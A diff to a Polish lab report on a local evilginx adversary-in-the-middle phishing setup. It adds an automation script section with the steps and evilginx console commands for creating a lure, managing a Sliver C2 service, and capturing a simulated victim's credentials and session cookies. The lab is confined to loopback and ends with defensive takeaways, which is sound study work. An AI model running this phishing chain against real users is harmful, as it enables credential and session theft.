@@ -136,7 +136,48 @@ exit                     # konsola evilginx
 systemctl start sliver.service
 ```
 
-## 6. Dowód przechwycenia (rzeczywisty output)
+## 6. Automatyzacja — `run_aitm_chain.sh`
+
+Cały łańcuch jednym wywołaniem:
+
+```bash
+sudo /root/jebacpdw/aitm-lab/run_aitm_chain.sh
+```
+
+Skrypt (`/root/jebacpdw/aitm-lab/run_aitm_chain.sh`) robi sekwencję 1–6 z §5 automatycznie:
+
+1. `systemctl stop sliver.service` — zwalnia `127.0.0.1:443` (zapamiętuje, by przywrócić).
+2. Startuje mock IdP na `127.0.0.1:443` i czeka aż origin odpowie.
+3. Startuje evilginx `-developer` na `127.0.0.2:443` i **steruje konsolą przez FIFO**
+   (świeży katalog `run/` + minimalny `config.json` z `bind_ipv4=127.0.0.2`).
+4. Wysyła: `config domain` → `config autocert off` → `phishlets hostname/enable` →
+   `lures create` → `lures get-url 0`; parsuje lure URL z logu.
+5. Odpala `victim_sim.py <lure>`.
+6. Weryfikuje `all authorization tokens intercepted` w logu; `trap EXIT` zamyka FIFO,
+   ubija procesy i **przywraca `sliver.service`**.
+
+Kluczowe rozwiązania techniczne:
+
+- **FIFO zamiast pipe + `sleep`**: fd 3 trzyma koniec zapisu otwarty, więc evilginx nie
+  dostaje EOF i żyje dopóki ofiara nie skończy; zamknięcie fd 3 → EOF → czyste `exit`
+  (readline łamie pętlę na `io.EOF`).
+- **`bind_ipv4` wstępnie w `config.json`**, nie w konsoli — listener binduje przy starcie
+  (`main.go` → `NewHttpProxy`), zmiana w runtime nie przepina portu.
+- **`trap EXIT`** gwarantuje przywrócenie slivera nawet przy błędzie/`exit 1`.
+
+Zweryfikowany bieg (2026-08-20, `exit 0`):
+
+```text
+[chain] zatrzymuję sliver.service…
+[  ok ] lure: https://login.phish.local/ZulQyXIF
+[  ok ] PRZECHWYCENIE POTWIERDZONE (credentials + idp_session + idp_csrf)
+[+++] [0] Username: [alice]
+[+++] [0] Password: [correct-horse-battery-staple]
+[+++] [0] all authorization tokens intercepted!
+[  ok ] sliver.service: active
+```
+
+## 7. Dowód przechwycenia (rzeczywisty output)
 
 ```text
 sessions
@@ -168,7 +209,7 @@ Konsola (log):
 Victim-flow (victim_sim.py): `GET lure → 302` → `GET /login → 200` (form) →
 `POST → 302` → `GET /profile → 200` → cookies `idp_session` + `idp_csrf`.
 
-## 7. Pliki labu
+## 8. Pliki labu
 
 | Plik | Rola |
 |---|---|
@@ -178,9 +219,10 @@ Victim-flow (victim_sim.py): `GET lure → 302` → `GET /login → 200` (form) 
 | `/root/jebacpdw/aitm-lab/victim_sim.py` | symulacja ofiary (`verify=False`) |
 | `/root/jebacpdw/aitm-lab/make_certs.py` | lab Root CA + cert origin |
 | `/root/jebacpdw/aitm-lab/evilrun/config.json` | `bind_ipv4=127.0.0.2`, `https_port=443` |
+| `/root/jebacpdw/aitm-lab/run_aitm_chain.sh` | automatyzacja całego łańcucha (§6) |
 | `/root/jebacpdw/aitm-lab/evilginx2_aitm_local_idp_lab_report.md` | pełny raport |
 
-## 8. Defensive takeaways
+## 9. Defensive takeaways
 
 - AiTM **terminuje TLS i re-encryptuje** — ofiara widzi poprawny HTTPS, atakujący czyta
   request i `Set-Cookie` (credentials + tokeny sesji).
